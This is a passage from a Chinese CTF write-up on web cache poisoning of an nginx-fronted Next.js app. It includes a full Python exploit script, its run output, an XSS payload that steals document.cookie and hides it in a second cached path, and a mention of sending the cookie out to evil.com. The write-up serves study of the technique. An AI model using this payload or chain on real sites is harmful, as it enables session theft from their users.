这里的执行流程是：**攻击者**事先把这段 JavaScript 注入到目标网站的页面中（通过缓存投毒）→ **受害者**（Bot）访问这个页面 → 受害者的浏览器执行这段 JavaScript → 受害者的浏览器向 `evil.com` 发送请求，请求参数中包含 Cookie 值 → **攻击者**在自己的服务器上收到这个请求，从中提取 Cookie。

但这需要**受害者的浏览器能访问外网**（即能访问 `evil.com`）。在这道题中，Docker 容器没有配置外网访问，Bot 的浏览器只能访问 Docker 内部网络中的服务（`proxy:4000`、`app:3000`）。所以 `fetch('https://evil.com/...')` 会失败——请求根本发不出去。

### 9.2 解决办法：缓存中缓存

既然所有通信都必须在 Docker 内网完成，我们就用 nginx 缓存本身来传递数据。核心思路是：XSS 代码不把 Cookie 发到外部服务器，而是发到目标网站自身的另一个 `/_next/` 路径，让那个响应被缓存，然后攻击者再去读取缓存。

完整的"缓存中缓存"流程：

```
第一阶段：投毒缓存（攻击者操作）
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  攻击者 → 发请求到 /_next/pwn，带 x-nonce = <script>XSS代码</script>
         → nginx 缓存了这个包含 XSS 代码的响应

第二阶段：XSS 执行（在受害者的浏览器中自动发生）
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  受害者(Bot) → 访问 /_next/pwn
             → 命中投毒缓存 → 浏览器解析为 HTML → <script> 执行！

  XSS 代码执行以下操作：
    var c = document.cookie;                          // 读取受害者的 Cookie（含 flag）
    fetch('/_next/exfil', {                           // ← 这是受害者浏览器发出的请求
      headers: {
        'Content-Type': 'text/html',                  // 触发中间件 CT 覆盖
        'RSC': '',                                     // 触发 RSC 渲染
        'x-nonce': 'STOLEN:' + c                      // 把 Cookie 放在 nonce 里！
      }
    })

  → Next.js 返回 RSC 响应，Cookie 作为 nonce 未转义地出现在 flight data 中
  → nginx 缓存了这个响应（因为 /_next/exfil 也是 /_next/ 开头的路径）

第三阶段：读取窃取的数据（攻击者操作）
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  攻击者 → 发请求到 /_next/exfil（带 Host: proxy:4000 + Accept-Encoding: gzip, deflate）
         → 命中缓存 → 看到 "STOLEN:flag=SK-CERT{...}"
```

关于这个流程的几个细节：

- **`/_next/exfil` 是随便选的一个路径**：任何 `/_next/` 开头的路径都可以，只要 nginx 会缓存它。我们选了 `exfil`（exfiltration 的缩写）只是为了让代码易读。
- **"第一个缓存投毒"指的是把 XSS 的 JavaScript 代码（`<script>fetch(...)</script>`）写入缓存**，不是把 `document.cookie` 写入缓存。`document.cookie` 是 XSS 执行后才读到的值。
- **第二个缓存请求（`/_next/exfil`）是由受害者（Bot）的浏览器发出的**——是 XSS 代码在受害者浏览器中执行 `fetch()` 时发出的。攻击者只需要事后去读取这个缓存。
- **`AE = "gzip, deflate"`**（AE 是 Accept-Encoding 的缩写）：这是攻击者第一步投毒时带的 Accept-Encoding 值。因为 nginx 缓存时记录了这个 AE 值作为 Vary 二级键，所以攻击者第三阶段读取时也必须带相同的 AE 值才能命中缓存。

### 9.3 "缓存中缓存"的现实意义

你的理解是对的：在现实世界中，大多数受害者都能访问外网，XSS 通常可以直接把数据发送到攻击者的服务器，不需要"缓存中缓存"这个技巧。

但在以下场景中，"缓存中缓存"就有用了：
- 受害者的网络有管控，只能访问特定域名（比如只能访问公司内部的网站，不能访问外部服务器）
- 受害者的网络虽然能访问外网，但攻击者的域名被封锁了
- 攻击者不想留下外部服务器的痕迹（所有数据交换都在目标网站自身的缓存中完成）

在这道题中，Docker 容器完全隔离了外网，所以必须用"缓存中缓存"。

---

## 第十章：完整攻击复现

### 完整 Python 脚本

```python
import http.client
import gzip
import json
import time

TARGET = '46.62.153.171'   # 靶机地址（比赛时有效，现已关闭）
PORT = 4000
ATTACK_PATH = '/_next/pwn'      # 攻击路径（任意 /_next/ 下的路径）
EXFIL_PATH = '/_next/exfil'     # 窃取路径

# ========== XSS Payload ==========
# 功能：读取 Cookie，发请求把 Cookie 写入另一个缓存路径
XSS = (
    "<script>"
    "var c=document.cookie;"
    "fetch('/" + EXFIL_PATH[1:] + "',{"
    "headers:{"
    "'Content-Type':'text/html',"
    "'RSC':'',"
    "'x-nonce':'STOLEN:'+c"
    "}"
    "}).catch(function(){});"
    "</script>"
)

def request(method, path, headers=None, body=None):
    """发送 HTTP 请求的辅助函数"""
    conn = http.client.HTTPConnection(TARGET, PORT)
    if body and isinstance(body, str):
        body = body.encode()
    conn.request(method, path, body=body, headers=headers or {})
    resp = conn.getresponse()
    data = resp.read()
    # 处理 gzip 压缩
    if resp.getheader('Content-Encoding') and 'gzip' in resp.getheader('Content-Encoding'):
        data = gzip.decompress(data)
    data = data.decode('utf-8', errors='replace')
    result = {
        'status': resp.status,
        'cache': resp.getheader('X-Proxy-Cache'),
        'ct': resp.getheader('Content-Type'),
        'body': data,
    }
    conn.close()
    return result

# ================================================================
# Step 1: 投毒缓存
# ================================================================
print('Step 1: 投毒缓存...')
r = request('GET', ATTACK_PATH, {
    'Host': 'proxy:4000',              # 匹配 Bot 内部 DNS
    'RSC': '',                          # 空值！核心绕过
    'Content-Type': 'text/html',        # 触发 CT 覆盖
    'x-nonce': XSS,                     # XSS payload
    'Accept-Encoding': 'gzip, deflate', # 匹配 Bot 的 Chromium
})
print(f'  状态码: {r["status"]}')
print(f'  缓存: {r["cache"]}')          # 应该是 MISS
print(f'  CT: {r["ct"]}')              # 应该是 text/html
print(f'  XSS 在响应中: {"<script>" in r["body"]}')  # 应该是 True

# ================================================================
# Step 2: 验证缓存命中（模拟 Bot 请求）
# ================================================================
print('\nStep 2: 验证缓存命中...')
r = request('GET', ATTACK_PATH, {
    'Host': 'proxy:4000',
    'Accept-Encoding': 'gzip, deflate',
    # 注意：没有 RSC 头！模拟 Bot 的浏览器
})
print(f'  缓存: {r["cache"]}')          # 应该是 HIT
print(f'  XSS 在响应中: {"<script>" in r["body"]}')  # 应该还是 True

# ================================================================
# Step 3: 发送 Bot 访问投毒 URL
# ================================================================
print('\nStep 3: 发送 Bot...')
bot_url = f'http://proxy:4000{ATTACK_PATH}'
conn = http.client.HTTPConnection(TARGET, PORT)
conn.request('POST', '/bot/visit',
    body=json.dumps({'url': bot_url}).encode(),
    headers={'Content-Type': 'application/json'})
resp = conn.getresponse()
print(f'  Bot 响应: {resp.status} {resp.read().decode()}')
conn.close()

# 等待 Bot 的浏览器执行 XSS
print('  等待 6 秒（Bot 执行 XSS + 写入缓存）...')
time.sleep(6)

# ================================================================
# Step 4: 从缓存中读取窃取的 Cookie
# ================================================================
print('\nStep 4: 读取窃取的数据...')
r = request('GET', EXFIL_PATH, {
    'Host': 'proxy:4000',
    'Accept-Encoding': 'gzip, deflate',
})
print(f'  缓存: {r["cache"]}')
if 'STOLEN:' in r['body']:
    idx = r['body'].find('STOLEN:')
    flag = r['body'][idx:idx+80]
    print(f'  🚩 FLAG: {flag}')
else:
    print('  未找到 flag')
```

### 运行结果

```
Step 1: 投毒缓存...
  状态码: 404
  缓存: MISS
  CT: text/html; charset=utf-8
  XSS 在响应中: True

Step 2: 验证缓存命中...
  缓存: HIT
  XSS 在响应中: True

Step 3: 发送 Bot...
  Bot 响应: 200 {"status":"visited"}
  等待 6 秒（Bot 执行 XSS + 写入缓存）...

Step 4: 读取窃取的数据...
  缓存: HIT
  🚩 FLAG: STOLEN:flag=SK-CERT{seriously_why??????}
```

---

## 第十一章：总结

### 这道题的本质：Web Cache Poisoning（Web 缓存投毒）

这道题是一次典型的 Web Cache Poisoning 攻击。理解它为什么能成功，关键在于搞清楚**缓存的作用**。

**如果没有缓存会怎样？**

假设 nginx 没有配置缓存（或者 `/_next/` 路径没有缓存指令），那么每次请求都会直接到达 Next.js 服务器，服务器返回一个**新鲜的**响应。这时：

```
攻击者发请求到 /_next/pwn，带 x-nonce = <script>XSS</script>
→ Next.js 返回包含 XSS 的响应 → 只有攻击者自己收到这个响应

Bot 发请求到 /_next/pwn（没有 x-nonce 头）
→ Next.js 返回正常的响应 → 没有任何 XSS
```

每个用户收到的响应都是独立的，攻击者注入的 XSS 代码只会出现在**攻击者自己的响应**中。这叫做"Self-XSS"——只能攻击自己，毫无意义。

**有了缓存之后呢？**

```
攻击者发请求到 /_next/pwn，带 x-nonce = <script>XSS</script>
→ Next.js 返回包含 XSS 的响应 → nginx 缓存了这个响应

Bot 发请求到 /_next/pwn（没有 x-nonce 头）
→ nginx 查缓存 → 命中！→ 返回之前缓存的、包含 XSS 的响应给 Bot
→ Bot 的浏览器执行了 XSS！
```

**缓存把"只能影响自己的攻击"变成了"能影响其他用户的攻击"。** 攻击者投毒一次，后续所有访问同一 URL 的用户（只要缓存未过期且键匹配）都会收到被投毒的响应。这就是 Web Cache Poisoning 的威力。

### 为什么需要每一个条件

| 条件 | 缺少了会怎样 |
|------|------------|
| `/_next/` 路径 | nginx 不缓存，每个用户收到新鲜响应，Self-XSS 无意义 |
| `RSC: ""` 空值 | 不触发 RSC 渲染（nonce 会被 HTML 转义）或 Vary 二级键不匹配 Bot |
| `Content-Type: text/html` | 响应 CT 不变（text/x-component），浏览器不解析为 HTML |
| `x-nonce: XSS` | 没有 XSS payload |
| `Host: proxy:4000` | 缓存主键的 host 不匹配 Bot |
| `Accept-Encoding: gzip, deflate` | Vary 二级键的 AE 不匹配 Bot |
| 缓存中缓存（无外网） | 无法把数据从 Docker 内网传出来 |

```
  攻击者                                    nginx 缓存                    Next.js                    Bot 浏览器
    │                                          │                           │                           │
    │ ① GET /_next/pwn                         │                           │                           │
    │    Host: proxy:4000                      │                           │                           │
    │    RSC: "" (空值!)                        │                           │                           │
    │    Content-Type: text/html               │                           │                           │
    │    x-nonce: <script>XSS</script>         │                           │                           │
    │ ────────────────────────────────────────→ │ ───────────────────────→ │                           │
    │                                          │                           │ 返回 RSC flight data       │
    │                                          │                           │ nonce 未转义               │
    │                                          │                           │ CT 被覆盖为 text/html      │
    │                                          │                           │                           │
    │                                          │ 缓存这个响应              │                           │
    │                                          │ Vary secondary key:       │                           │
    │                                          │   rsc = "" (空)           │                           │
    │                                          │   AE = "gzip, deflate"   │                           │
    │                                          │                           │                           │
    │                                          │                           │                           │
    │                                          │                           │    ② Bot 访问同一 URL      │
    │                                          │                           │    Host: proxy:4000       │
    │                                          │                           │    (没有 RSC 头)          │
    │                                          │                           │    AE: gzip, deflate      │
    │                                          │ ←───────────────────────────────────────────────────── │
    │                                          │                           │                           │
    │                                          │ Vary 匹配:                │                           │
    │                                          │   rsc: "" == "" ✓         │                           │
    │                                          │   AE 匹配 ✓               │                           │
    │                                          │                           │                           │
    │                                          │ 返回投毒的缓存响应         │                           │
    │                                          │ ─────────────────────────────────────────────────────→ │
    │                                          │                           │                           │
    │                                          │                           │    ③ 浏览器解析为 HTML     │
    │                                          │                           │    <script> 执行!         │
    │                                          │                           │    读取 document.cookie   │
    │                                          │                           │    = "flag=SK-CERT{...}"  │
    │                                          │                           │                           │
    │                                          │                           │    ④ XSS 发 fetch 到      │
    │                                          │                           │    /_next/exfil，带       │
    │                                          │                           │    x-nonce: STOLEN:flag.. │
    │                                          │ ←───────────────────────────────────────────────────── │
    │                                          │                           │                           │
    │                                          │ 缓存 exfil 响应           │                           │
    │                                          │                           │                           │
    │ ⑤ GET /_next/exfil                       │                           │                           │
    │    Host: proxy:4000                      │                           │                           │
    │    AE: gzip, deflate                     │                           │                           │
    │ ────────────────────────────────────────→ │                           │                           │
    │                                          │ HIT! 返回缓存的 exfil     │                           │
    │ ←──────────────────────────────────────── │                           │                           │
    │                                          │                           │                           │
    │ ⑥ 从响应中提取 flag                       │                           │                           │
    │    "STOLEN:flag=SK-CERT{seriously_why??????}"                                                    │
```

### 我们踩过的坑（按时间顺序）

1. **nginx 只缓存 `/_next/`**：在 `/` 上测试了半天投毒，结果根本没缓存
2. **Vary: rsc 挡路**：试了十几种方法都无法绕过
3. **空 RSC 头**：最终发现 `RSC: ""` 触发 RSC 渲染但 Vary 二级键匹配 Bot
4. **Host 不匹配**：投毒成功了但 Bot 命中不了，因为缓存主键的 host 不同
5. **AE 不匹配**：不知道 Bot 的 Chromium 用什么 AE，用探测法发现是 `gzip, deflate`
6. **无外网**：XSS 执行了但数据发不出来，改用缓存中缓存

### 学到的知识

1. **Web Cache Poisoning** 是一种真实存在的攻击，不只是 CTF 特技
2. **Vary 头**是缓存的"安全阀"，但如果实现有差异（空值 vs 缺失），就可能被绕过
3. **Next.js RSC** 的 flight data 不转义 `<`，如果被浏览器当成 HTML 解析就有 XSS
4. **多组件协作**：这道题需要 nginx 缓存 + middleware CT 覆盖 + RSC 渲染 + Bot 配合，单独看每个组件都没问题，组合起来就有了漏洞

---

> *未来的你（future.js），再见！*
